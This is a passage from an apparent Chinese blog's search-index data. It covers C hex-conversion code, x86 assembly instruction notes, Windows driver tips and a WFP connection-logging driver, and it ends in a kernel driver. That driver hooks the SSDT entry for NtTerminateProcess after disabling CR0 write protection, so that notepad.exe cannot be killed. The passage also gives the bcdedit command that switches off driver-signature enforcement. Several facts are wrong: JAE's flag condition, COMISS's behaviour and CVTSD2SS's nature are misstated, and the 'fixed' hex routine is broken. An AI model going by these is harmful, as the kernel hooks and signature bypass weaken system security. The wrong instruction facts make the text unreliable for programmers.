&#123;&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27;&#125;;void to_hex(char *s, int l, char *d)&#123; while(l--) &#123; *(d+2*l+1) = hex_table[(*(s+l))&amp;0x0f]; *(d+2*l) = hex_table[(*(s+l))&gt;&gt;4]; &#125;&#125;static voidbytesToHex(uint8 b[16], char *s)&#123; static const char *hex = &quot;0123456789abcdef&quot;; int q, w; for (q = 0, w = 0; q &lt; 16; q++) &#123; s[w++] = hex[(b[q] &gt;&gt; 4) &amp; 0x0F]; s[w++] = hex[b[q] &amp; 0x0F]; &#125; s[w] = &#x27;\\0&#x27;;&#125;int main () &#123; char s[]= &quot;1234abcd&quot;; char d[1024]; d[8] = &#x27;\\0&#x27;; to_hex(s,sizeof(s)/sizeof(char) - 1,d); printf(&quot;%s&quot;,d); return 0;&#125; 关于 ASCII 转 HEX 我提出一点问题，在 https://www.onlinegdb.com/ 在线编译，运行上述代码，编译得到的结果略微有点问题： 13132333461626364 可以看到小于 10 的数字的第一位都被3填充了。可能是因为栈空间默认初始化的时候都是被 0x00000011 这样的数据填充的。稍微修改了下，加了个判断如下所示： 1234567891011121314void to_hex(char *s, int l, char *d)&#123; while(l--) &#123; if(*s &gt; &#x27;9&#x27;) *d = hex_table[(*s &gt;&gt; 4) &amp; 0x0f]; else *d = hex_table[(*s &gt;&gt; 4) &amp; 0x00]; d++; *d = hex_table[*s &amp; 0x0f]; s++; d++; &#125;&#125; 一种更高效的实现：12345678910111213141516171819202122#include &lt;stdio.h&gt;void from_hex(char *s, int l, char *d)&#123; while(l--) &#123; *d = (*s&gt;&#x27;9&#x27; ? *s+9 : *s) &lt;&lt; 4; ++s; *d |= (*s&gt;&#x27;9&#x27; ? *s+9 : *s) &amp; 0x0F; ++s; ++d; &#125;&#125;int main () &#123; char s[]= &quot;6F6B6f6b&quot;; char d[5]; d[4] = &#x27;\\0&#x27;; from_hex(s,4,d); printf(&quot;%s&quot;,d); return 0;&#125; 123456789101112131415161718192021222324#include &lt;stdio.h&gt;const char hex_table[] = &#123;&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27;&#125;;void to_hex(char *s, int l, char *d)&#123; while(l--) &#123; *d = hex_table[*s &gt;&gt; 4 &amp; 0]; d++; *d = hex_table[*s &amp; 0x0f]; s++; d++; &#125;&#125;int main () &#123; char s[]= &quot;1234&quot;; char d[9]; d[8] = &#x27;\\0&#x27;; to_hex(s,4,d); printf(&quot;%s&quot;,d); return 0;&#125;","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"C","slug":"B-Code/C","permalink":"http://example.com/categories/B-Code/C/"}]},{"title":"汇编命令整理","date":"2023-10-27T01:24:02.092Z","path":"B_Code/汇编/汇编基础命令/","text":"概述: 汇编命令整理 [toc] COMISSCOMISS（Compare Or Ordered Move SIMD Single）指令是x86指令集中的一条比较指令，用于比较两个单精度浮点数或单精度寄存器，并设置标志位。它也可以将比较结果移动到另一个寄存器或内存位置。 具体来说，COMISS指令将两个单精度浮点数或单精度寄存器进行比较，并设置标志位ZF（Zero Flag，零标志位）、PF（Parity Flag，奇偶标志位）和CF（Carry Flag，进位标志位）。它可以将比较结果移动到目标寄存器或内存位置。 例如，以下是一条COMISS指令的示例代码： 123复制代码comiss xmm1, xmm2 ; 比较xmm1和xmm2寄存器中的单精度浮点数 该指令会将两个寄存器中的单精度浮点数进行比较，并设置相应的标志位。然后，可以将比较结果移动到另一个寄存器或内存位置。 需要注意的是，COMISS指令只能用于单精度浮点数的比较，不能用于双精度浮点数的比较。 CVTSD2SSCVTSD2SS 是 Intel C&#x2F;C++ 编译器的一个指令，用于将 64 位双精度浮点数转换为 32 位单精度浮点数。在此过程中，源操作数（SRC）被读取并转换为 32 位单精度浮点数，然后存储在目标操作数（DEST）中。 注意，以上信息仅供参考。在实际编程中，如果你使用 CVTSD2SS 指令，你需要参考 Intel 处理器的架构和相关文档，以确保你的代码可以在目标硬件上正确执行。 JAE 在汇编语言中，JAE（Jump if Above or Equal）指令是一种根据无符号整数比较的结果进行条件转移的指令。 当CF（Carry Flag）为0且ZF（Zero Flag）为0时，表示前面的操作结果是无符号整数大于（Above）或等于（Equal）的情况，此时执行跳转操作。 例如，假设当前指令的地址为0x1000，下一条指令的地址为0x1001，而某个无符号整数的比较结果使得CF为0且ZF为0，那么执行JAE指令后，程序将会跳转到地址0x1001处执行下一条指令。 需要注意的是，具体的指令用法和语法可能会因为不同的汇编语言而略有不同，具体需要参考对应的汇编语言文档或手册。 JE 在汇编语言中，JE指令全称为“Jump if Equal”，也被称为“Jump if Zero”。它根据标志寄存器中的零标志位(ZF)的值来判断是否进行跳转。当ZF为1时，表示前面的操作结果为零，则跳转到目标地址执行；当ZF为0时，则不进行跳转。 JP 在汇编语言中，JP（Jump if Parity）指令是一种根据奇偶标志位PF（Parity Flag）的状态进行跳转的条件转移指令。 当PF为1时，表示前面操作的结果具有偶数个1位（即低8位有偶数个1），此时执行跳转操作；当PF为0时，表示前面操作的结果具有奇数个1位（即低8位有奇数个1），此时不执行跳转操作。 例如，假设当前指令的地址为0x1000，下一条指令的地址为0x1001，而某个操作的结果使得PF为1，那么执行JP指令后，程序将会跳转到地址0x1001处执行下一条指令。 需要注意的是，具体的指令用法和语法可能会因为不同的汇编语言而略有不同，具体需要参考对应的汇编语言文档或手册。 DD DD 作为伪操作命令，用于定义操作数占用的字节数，即DoubleWord的缩写，表示4个字节（32位）。 movapsmovaps是x86指令集中的一种指令，用于将对齐的封装好的128位数据从源地址移动到目标地址。这个指令通常用于处理SSE（Streaming SIMD Extensions）寄存器之间的数据传送。 在movaps指令中，”aps”表示”Aligned Packed Single”，即对齐的封装好的单精度浮点数。它要求源地址和目标地址都是16字节对齐的，以确保数据传送的效率。 例如，假设有两个SSE寄存器xmm0和xmm1，以及一个内存地址addr，那么可以使用以下指令将xmm0中的数据移动到addr所指向的内存中： 123复制代码movaps [addr], xmm0 这个指令将会将xmm0中的128位数据（即4个单精度浮点数）对齐地存储在addr所指向的内存地址中。 movss movss 是x86指令集中的一种单精度移动指令，用于将单精度浮点数（32位）从一个位置移动到另一个位置。这个指令可以用于寄存器之间、存储器和寄存器之间、存储器之间的数据传送。","tags":[{"name":"汇编","slug":"汇编","permalink":"http://example.com/tags/%E6%B1%87%E7%BC%96/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"汇编","slug":"B-Code/汇编","permalink":"http://example.com/categories/B-Code/%E6%B1%87%E7%BC%96/"}]},{"title":"【驱动】禁用签名","date":"2023-10-27T01:24:02.091Z","path":"A_OS/Windows/驱动/驱动禁用签名/","text":"方法一：使用命令提示符 首先，按下Win+X组合键，选择“命令提示符（管理员）”。 在命令提示符窗口中，输入以下命令并按下回车键： 1bcdedit /set testsigning on 系统会显示“操作成功完成”的提示信息，表示已成功禁用驱动签名。 重新启动电脑，即可生效。 现在，你已经成功禁用了Win10的驱动签名限制，可以自由安装非官方或未经认证的驱动程序了！但是请注意，禁用驱动签名可能会带来一定的安全风险，所以在安装驱动程序时，请确保来源可靠，并及时恢复驱动签名以保证系统的安全性。 希望本文的教程能够帮助到大家，让你的电脑更加自由灵活。如果你有任何问题或者建议，欢迎在评论区留言，我会尽力解答。祝大家使用愉快！","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"驱动","slug":"A-OS/Windows/驱动","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"}]},{"title":"【驱动】指定的服务一杯标记为删除如何解决","date":"2023-10-27T01:24:02.090Z","path":"A_OS/Windows/驱动/驱动开发常见错误及解决方案/","text":"概述： windows驱动开发常见错误整理及其解决思路整理 [toc] 1 指定的服务已被标记为删除在Windows系统中，有时候在尝试启动或停止服务时，可能会遇到“指定的服务已被标记为删除”错误。这个错误常是由于服务已被删除，但是其配置信息仍然存在于系统中所导致的。本文将详细讲解如何解决“指定的服务已被标记为删除”错误，包括使用方法和示例说明。 解决“指定的服务已被标记为删除”错误要解决指定的服务已被标记为删除”错误，可以使用以下方法： 方法一：使用命令行 打开命令提示符（以管理员身份运行）。 输入以下命令： 1sc delete servicename 其中，servicename是要删除的服务的名称。 按下回车键，待命执行完成。 重新启动计算机。 方法二：使用注册表编辑器 打开注册表编辑器（以管理员身份运行）。 导航到以下路径： 1HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services 3.找并删除要删除的服务的子项。 重新启动计算机。 使用示例以下是两个使用命令行和注册表编辑器解决“指定的服务已被标记为删除”错误的示例说明： 使用命令行删除服务：假设我们需要删除名“testservice”的服务，可以使用以下命令： 1sc delete testservice 这样就可以删除该服务。 使用注册表编辑器删除服务：假设我们需要删除名为“testservice”的服务，可以使用以下步骤： 打开注册表编辑器。 导航到“HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services”路径。 查找名为“testservice”的子项，并删除该子项。 重新启动计算机。 这样就可以删除该服务。 总结以上是关于如何解决“指定的服务已被标记为删除”错误的攻略，包括方法和示例说明。如果您遇到了这个错误，请尝试使用以上方法解决。","tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"},{"name":"驱动","slug":"驱动","permalink":"http://example.com/tags/%E9%A9%B1%E5%8A%A8/"},{"name":"OS","slug":"OS","permalink":"http://example.com/tags/OS/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"驱动","slug":"A-OS/Windows/驱动","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"}]},{"title":"【驱动】常见安装错误","date":"2023-10-27T01:24:02.089Z","path":"A_OS/Windows/驱动/驱动安装错误/","text":"概述：常见驱动安装错误已经解决方案 当前文章收录的驱动错误 【驱动】常见安装错误 安装声网卡驱动报错，代码：0xe0000246打开注册表，找到：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DeviceInstall\\Parameters 将：DeviceInstallDisabled 的值改为 0重新安装驱动即可 参考：0xe0000246解决方案 注册表被保护问题https://techquack.com/how-to-fix-the-the-configuration-registry-database-is-corrupt-error/","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"驱动","slug":"A-OS/Windows/驱动","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"}]},{"title":"【驱动】一个完整的wfp驱动","date":"2023-10-27T01:24:02.088Z","path":"A_OS/Windows/驱动/一个完整地wfp驱动/","text":"概述：一个完整的 WFP 驱动程序 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390#include &lt;ntddk.h&gt;#pragma warning(push)#pragma warning(disable:4201) // unnamed struct/union#pragma warning(disable:4995)#include &lt;fwpsk.h&gt;#pragma warning(pop)#include &lt;ndis.h&gt;#include &lt;fwpmk.h&gt;#include &lt;limits.h&gt;#include &lt;ws2ipdef.h&gt;#include &lt;in6addr.h&gt;#include &lt;ip2string.h&gt;#include &lt;strsafe.h&gt;#define INITGUID#include &lt;guiddef.h&gt;#define bool BOOLEAN#define true TRUE #define false FALSE#define DEVICE_NAME L&quot;\\\\Device\\\\WFP_TEST&quot;#define DEVICE_DOSNAME L&quot;\\\\DosDevices\\\\WFP_TEST&quot;#define kmalloc(_s) ExAllocatePoolWithTag(NonPagedPool, _s, &#x27;SYSQ&#x27;)#define kfree(_p) ExFreePool(_p)DEFINE_GUID // &#123;6812FC83-7D3E-499a-A012-55E0D85F348B&#125;(GUID_ALE_AUTH_CONNECT_CALLOUT_V4,0x6812fc83,0x7d3e,0x499a,0xa0, 0x12, 0x55, 0xe0, 0xd8, 0x5f, 0x34, 0x8b);PDEVICE_OBJECT gDevObj;HANDLE gEngineHandle = 0;HANDLE gInjectHandle = 0;//CalloutIdUINT32 gAleConnectCalloutId = 0;//FilterIdUINT64 gAleConnectFilterId = 0;/*以下两个回调函数没啥用*/NTSTATUS NTAPI WallNotifyFn(IN FWPS_CALLOUT_NOTIFY_TYPE notifyType,IN const GUID *filterKey,IN const FWPS_FILTER *filter)&#123; KdPrint((&quot;NotifyFn\\n&quot;)); return STATUS_SUCCESS;&#125;VOID NTAPI WallFlowDeleteFn(IN UINT16 layerId,IN UINT32 calloutId,IN UINT64 flowContext)&#123; KdPrint((&quot;FlowDeleteFn\\n&quot;)); return;&#125;//协议代码转为名称char* ProtocolIdToName(UINT16 id)&#123; char *ProtocolName = kmalloc(16); RtlZeroMemory(ProtocolName,16); switch (id) &#123; case 1: strcpy_s(ProtocolName, 4 + 1, &quot;ICMP&quot;); break; case 2: strcpy_s(ProtocolName, 4 + 1, &quot;IGMP&quot;); break; case 6: strcpy_s(ProtocolName, 3 + 1, &quot;TCP&quot;); break; case 17: strcpy_s(ProtocolName, 3 + 1, &quot;UDP&quot;); break; case 27: strcpy_s(ProtocolName, 3 + 1, &quot;RDP&quot;); break; default: strcpy_s(ProtocolName, 7 + 1, &quot;UNKNOWN&quot;); break; &#125; return ProtocolName;&#125;//最重要的过滤函数void NTAPI WallALEConnectClassify(IN const FWPS_INCOMING_VALUES0* inFixedValues,//此结构包含筛选层上每个数据字段的值 //incomingValue[index] =&gt; index的值是枚举类型FWPS_FIELDS_ALE_AUTH_CONNECT_V4,//枚举名字说明了该值的类型例如:FWPS_FIELD_ALE_AUTH_CONNECT_V4_IP_LOCAL_ADDRESS 就是本地IP IN const FWPS_INCOMING_METADATA_VALUES0* inMetaValues,//此结构包含筛选层上每个元数据字段的值。IN OUT void* layerData,//指向结构的指针，该结构描述正在过滤的层上的原始数据。此参数可能为NULL，//这取决于所筛选的层和调用classfyFn0标注函数的条件。//对于流层，此参数指向FWPS_stream_Callout_IO_PACKET 0结构。//对于所有其他层，如果NetBufferList结构不是NULL，则该参数指向该结构。IN const void* classifyContext,//由过滤器引擎指向与标注驱动程序关联的上下文数据的指针 没有找出该指针类型IN const FWPS_FILTER* filter,//指向FWPS_FILTER1结构的指针。此结构描述指定筛选器操作的标注的筛选器。IN UINT64 flowContext,//包含与数据流关联的上下文的UINT 64类型变量。如果没有与数据流相关联的上下文，则此参数为零。//如果在不支持数据流的过滤层将标注添加到筛选引擎中，则clamfyFn1回调函数应忽略此参数OUT FWPS_CLASSIFY_OUT* classifyOut //指向FWPS_GARGY_OUT 0结构的指针，该结构接收clamfyFn1回调函数返回给调用方的任何数据)&#123; char *ProtocolName = NULL; DWORD LocalIp, RemoteIP; PWCHAR Path = NULL; do &#123; Path = ExAllocatePoolWithTag(NonPagedPool, inMetaValues-&gt;processPath-&gt;size+2, &#x27;NET&#x27;); if (NULL==Path) &#123; break; &#125; RtlZeroMemory(Path, inMetaValues-&gt;processPath-&gt;size + 2); wcscpy_s(Path, inMetaValues-&gt;processPath-&gt;size / 2, (WCHAR*)inMetaValues-&gt;processPath-&gt;data); LocalIp = inFixedValues-&gt;incomingValue[FWPS_FIELD_ALE_AUTH_CONNECT_V4_IP_LOCAL_ADDRESS].value.uint32; RemoteIP = inFixedValues-&gt;incomingValue[FWPS_FIELD_ALE_AUTH_CONNECT_V4_IP_REMOTE_ADDRESS].value.uint32; ProtocolName = ProtocolIdToName(inFixedValues-&gt;incomingValue[FWPS_FIELD_ALE_AUTH_CONNECT_V4_IP_PROTOCOL].value.uint16); DbgPrint(&quot;进程ID : %d&quot;, (DWORD)(inMetaValues-&gt;processId)); DbgPrint(&quot;Path=%S&quot;, Path); DbgPrint(&quot;本地地址=%u.%u.%u.%u &quot;, (LocalIp &gt;&gt; 24) &amp; 0xFF, (LocalIp &gt;&gt; 16) &amp; 0xFF, (LocalIp &gt;&gt; 8) &amp; 0xFF, LocalIp &amp; 0xFF); DbgPrint(&quot;端口%d\\n&quot;, inFixedValues-&gt;incomingValue[FWPS_FIELD_ALE_AUTH_CONNECT_V4_IP_LOCAL_PORT].value.uint16); DbgPrint(&quot;远程地址=%u.%u.%u.%u &quot;, (RemoteIP &gt;&gt; 24) &amp; 0xFF, (RemoteIP &gt;&gt; 16) &amp; 0xFF, (RemoteIP &gt;&gt; 8) &amp; 0xFF, RemoteIP &amp; 0xFF); DbgPrint(&quot;端口%d\\n&quot;, inFixedValues-&gt;incomingValue[FWPS_FIELD_ALE_AUTH_CONNECT_V4_IP_REMOTE_PORT].value.uint16); DbgPrint(&quot;协议名: %s\\n&quot;, ProtocolName); kfree(ProtocolName); &#125; while (0); if (NULL != Path) &#123; ExFreePoolWithTag(Path, &#x27;NET&#x27;); &#125; classifyOut-&gt;actionType = FWP_ACTION_PERMIT;//允许连接 return;&#125;NTSTATUS RegisterCalloutForLayer(IN const GUID* layerKey,IN const GUID* calloutKey,IN FWPS_CALLOUT_CLASSIFY_FN classifyFn,IN FWPS_CALLOUT_NOTIFY_FN notifyFn,IN FWPS_CALLOUT_FLOW_DELETE_NOTIFY_FN flowDeleteNotifyFn,OUT UINT32* calloutId, //注册callout时返回此IDOUT UINT64* filterId)&#123; NTSTATUS status = STATUS_SUCCESS; FWPS_CALLOUT sCallout = &#123; 0 &#125;; FWPM_FILTER mFilter = &#123; 0 &#125;; FWPM_FILTER_CONDITION mFilter_condition[1] = &#123; 0 &#125;; FWPM_CALLOUT mCallout = &#123; 0 &#125;; FWPM_DISPLAY_DATA mDispData = &#123; 0 &#125;; BOOLEAN bCalloutRegistered = FALSE; //这里未指定sCallout.flags sCallout.calloutKey = *calloutKey; //一个唯一的GUID值,用来标记此callout sCallout.classifyFn = classifyFn; //每当回调处理网络数据时，过滤器引擎将调用此函数,处理网络数据在这个回调函数里面处理. sCallout.flowDeleteFn = flowDeleteNotifyFn; //每当终止由回调处理的数据流时，筛选器引擎将调用此函数 sCallout.notifyFn = notifyFn; //卸载callout时,会调用这个回调 //要使用哪个设备对象注册 status = FwpsCalloutRegister(gDevObj, //自己创建的设备对象 &amp;sCallout, //该结构体有用的是指定了classifyFn回调,处理连接时的数据就会用到这个回调函数. calloutId //返回的calloutID ,取消注册callout会用到这个值 ); if (!NT_SUCCESS(status)) goto exit; bCalloutRegistered = TRUE; mDispData.name = L&quot;WFP TEST&quot;; //可选的名字 mDispData.description = L&quot;yxp&#x27;s WFP TEST&quot;; //可选的描述 //你感兴趣的内容 mCallout.applicableLayer = *layerKey; //过滤层标识符 此过滤层允许授权对传出tcp连接的连接请求， //以及基于发送的第一个数据包授权传出非tcp通信量 //你感兴趣的内容的GUID mCallout.calloutKey = *calloutKey; //该GUID值必须与FwpsCalloutRegister注册时的GUID值相同. mCallout.displayData = mDispData; //向过滤引擎添加callout status = FwpmCalloutAdd(gEngineHandle, &amp;mCallout, //flags没有设置 NULL, //安全描述符 可以为NULL NULL); //返回一个ID 与FwpsCalloutRegister函数返回的ID是相同的. if (!NT_SUCCESS(status)) goto exit; //FWPM_action0结构指定在所有筛选条件都为真时所采取的操作 mFilter.action.calloutKey = *calloutKey; //交给callout处理 由callout来决定返回阻止(block)或者允许(permit) mFilter.action.type = FWP_ACTION_CALLOUT_TERMINATING; //描述 mFilter.displayData.name = L&quot;WFP TEST&quot;; mFilter.displayData.description = L&quot;yxp&#x27;s WFP TEST&quot;; mFilter.layerKey = *layerKey; //这个值和FwpmCalloutAdd里面使用的值一样 过滤层标识符 此过滤层允许授权对传出tcp连接的连接请求， //以及基于发送的第一个数据包授权传出非tcp通信量 //过滤条件数 mFilter.numFilterConditions = 0; //过滤条件 mFilter.filterCondition = mFilter_condition; mFilter.subLayerKey = FWPM_SUBLAYER_UNIVERSAL; //此子层承载所有未分配给任何其他子层的筛选器 //BFE将根据过滤条件自动分配权重 mFilter.weight.type = FWP_EMPTY; //添加一个新的过滤器对象到系统中 status = FwpmFilterAdd(gEngineHandle, &amp;mFilter, NULL, filterId); if (!NT_SUCCESS(status)) goto exit;exit: if (!NT_SUCCESS(status)) &#123; if (bCalloutRegistered) &#123; FwpsCalloutUnregisterById(*calloutId); &#125; &#125; return status;&#125;NTSTATUS WallRegisterCallouts()&#123; NTSTATUS status = STATUS_SUCCESS; BOOLEAN bInTransaction = FALSE; BOOLEAN bEngineOpened = FALSE; FWPM_SESSION session = &#123; 0 &#125;; //置此标志时，会话结束时将自动删除在会话期间添加的任何对象 session.flags = FWPM_SESSION_FLAG_DYNAMIC; //开启WFP引擎 status = FwpmEngineOpen(NULL, RPC_C_AUTHN_WINNT, NULL, &amp;session, &amp;gEngineHandle); if (!NT_SUCCESS(status)) goto exit; bEngineOpened = TRUE; // 在当前会话中开始显式事务 status = FwpmTransactionBegin(gEngineHandle, 0); if (!NT_SUCCESS(status)) goto exit; bInTransaction = TRUE; //注册回调函数 status = RegisterCalloutForLayer( &amp;FWPM_LAYER_ALE_AUTH_CONNECT_V4, //此过滤层允许授权对传出tcp连接的连接请求， //以及基于发送的第一个数据包授权传出非tcp通信量 &amp;GUID_ALE_AUTH_CONNECT_CALLOUT_V4, WallALEConnectClassify, WallNotifyFn, WallFlowDeleteFn, &amp;gAleConnectCalloutId, &amp;gAleConnectFilterId); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;RegisterCalloutForLayer失败!\\n&quot;); goto exit; &#125; //确认所有内容并提交，让回调函数正式发挥作用 status = FwpmTransactionCommit(gEngineHandle); if (!NT_SUCCESS(status)) goto exit; bInTransaction = FALSE;exit: if (!NT_SUCCESS(status)) &#123; if (bInTransaction) &#123; FwpmTransactionAbort(gEngineHandle); &#125; if (bEngineOpened) &#123; FwpmEngineClose(gEngineHandle); gEngineHandle = 0; &#125; &#125; return status;&#125;NTSTATUS WallUnRegisterCallouts()&#123; if (gEngineHandle != 0) &#123; //删除FilterId FwpmFilterDeleteById(gEngineHandle, gAleConnectFilterId); //删除CalloutId FwpmCalloutDeleteById(gEngineHandle, gAleConnectCalloutId); //清空FilterId gAleConnectFilterId = 0; //反注册CalloutId FwpsCalloutUnregisterById(gAleConnectCalloutId); //清空CalloutId gAleConnectCalloutId = 0; //关闭引擎 FwpmEngineClose(gEngineHandle); gEngineHandle = 0; &#125; return STATUS_SUCCESS;&#125;VOID DriverUnload(PDRIVER_OBJECT driverObject)&#123; NTSTATUS status; UNICODE_STRING deviceDosName = &#123; 0 &#125;; status = WallUnRegisterCallouts(); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;WallUnRegisterCallouts失败\\n&quot;); return; &#125; RtlInitUnicodeString(&amp;deviceDosName, DEVICE_DOSNAME); IoDeleteSymbolicLink(&amp;deviceDosName); if (gDevObj) &#123; IoDeleteDevice(gDevObj); gDevObj = NULL; &#125; DbgPrint(&quot;驱动卸载成功\\n&quot;);&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath)&#123; UNICODE_STRING deviceName = &#123; 0 &#125;; UNICODE_STRING deviceDosName = &#123; 0 &#125;; NTSTATUS status = STATUS_SUCCESS; driverObject-&gt;DriverUnload = DriverUnload; RtlInitUnicodeString(&amp;deviceName, DEVICE_NAME); status = IoCreateDevice(driverObject, 0, &amp;deviceName, FILE_DEVICE_NETWORK, 0, FALSE, &amp;gDevObj); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;创建设备对象失败\\n&quot;); return STATUS_UNSUCCESSFUL; &#125; RtlInitUnicodeString(&amp;deviceDosName, DEVICE_DOSNAME); status = IoCreateSymbolicLink(&amp;deviceDosName, &amp;deviceName); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;创建符号链接失败\\n&quot;); return STATUS_UNSUCCESSFUL; &#125; status = WallRegisterCallouts(); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;WallRegisterCallouts 失败!\\n&quot;); return STATUS_UNSUCCESSFUL; &#125; DbgPrint(&quot;过滤驱动加载成功\\n&quot;); return status;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"驱动","slug":"驱动","permalink":"http://example.com/tags/%E9%A9%B1%E5%8A%A8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"驱动","slug":"A-OS/Windows/驱动","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"}]},{"title":"【驱动】保护进程","date":"2023-10-27T01:24:02.088Z","path":"A_OS/Windows/驱动/驱动保护进程/","text":"概述：windows驱动实现对进程的保护 0x01 说明主要的逻辑是在驱动中 hook NtTerminateProcess 函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133#include &lt;Ntifs.h&gt;//0x7A NTOpenProcess//0x101 NtTerminateProcess#define FuctionID 0x101 //调用号void PageProtectOn()&#123; //恢复内存保护 __asm &#123; mov eax,cr0 or eax,10000h mov cr0,eax sti &#125;&#125;void PageProtectOff()&#123; //去掉内存保护 __asm &#123; cli mov eax,cr0 and eax,not 10000h mov cr0,eax &#125;&#125;//1、找到系统服务表：函数地址表typedef struct _KSYSTEM_SERVICE_TABLE&#123; PULONG ServiceTableBase; //函数地址表基地址 PULONG ServiceCounterTableBase; //被访问了多少次 ULONG NumberOfService; //表中服务函数的总数 PUCHAR ParamTableBase; //服务函数的参数个数数组的起始地址&#125;KSYSTEM_SERVICE_TABLE,*PKSYSTEM_SERVICE_TABLE;typedef struct _KSERVICE_DESCRIPTOR_TABLE&#123; KSYSTEM_SERVICE_TABLE ntoskrnl;//ntoskrnl.exe的函数 KSYSTEM_SERVICE_TABLE win32k;//win32k.sys的函数 KSYSTEM_SERVICE_TABLE notUsed1;// KSYSTEM_SERVICE_TABLE notUsed2;//&#125;KSERVICE_DESCRIPTOR_TABLE,*PKSERVICE_DESCRIPTOR_TABLE;//NtTerminateProcess函数指针typedef NTSTATUS (*NTTERMINATEPROCESS) (HANDLE ProcessHandle, NTSTATUS ExitStatus);//KeServiceDescriptorTable时ntoskrnl.exe所导出的全局变量 申明一下就可以直接用了extern PKSERVICE_DESCRIPTOR_TABLE KeServiceDescriptorTable; //存储原来的函数地址ULONG uOldNtTerminateProcess;//2.准备用于替换的函数NTSTATUS MyNtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus)&#123; //自己的业务..各种过滤 或者修改返回结果 PEPROCESS pEprocess; NTSTATUS status; PCHAR ImageFileName; //通过句柄获取EPROCESS status = ObReferenceObjectByHandle(ProcessHandle,FILE_ANY_ACCESS,*PsProcessType,KernelMode,&amp;pEprocess,NULL); if (!NT_SUCCESS(status)) &#123; return status; &#125; //获取进程名字 _EPROCESS + 0x171 == ImageFileName ImageFileName = (PCHAR)pEprocess + 0x174; //判断是否是要保护的进程 if (strcmp(ImageFileName, &quot;notepad.exe&quot;) == 0) &#123; //判断如何退出 if (ProcessHandle == (HANDLE)0xFFFFFFFF) &#123; //点X关闭 DbgPrint(&quot;点X关闭 成功退出:%s: NtTerminateProcess(%x, %x)\\n&quot;, ImageFileName, ProcessHandle, ExitStatus); return ((NTTERMINATEPROCESS)uOldNtTerminateProcess)(ProcessHandle, ExitStatus); &#125; else if(ExitStatus == 1) &#123; // 通过任务管理器关闭 DbgPrint(&quot;通过任务管理器关闭 拒绝关闭:%s: NtTerminateProcess(%x, %x)\\n&quot;, ImageFileName, ProcessHandle, ExitStatus); return STATUS_ACCESS_DENIED; &#125; else &#123; return STATUS_ACCESS_DENIED; &#125; &#125; return ((NTTERMINATEPROCESS)uOldNtTerminateProcess)(ProcessHandle, ExitStatus);&#125;//3.修改函数地址NTSTATUS HookNtTerminateProcess()&#123; NTSTATUS Status; Status = STATUS_SUCCESS; PageProtectOff(); uOldNtTerminateProcess = KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[FuctionID]; KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[FuctionID] = (ULONG)MyNtTerminateProcess; PageProtectOn(); return Status;&#125;//4.恢复VOID UnHookNtTerminateProcess()&#123; PageProtectOff(); KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[FuctionID] = (ULONG)uOldNtTerminateProcess; 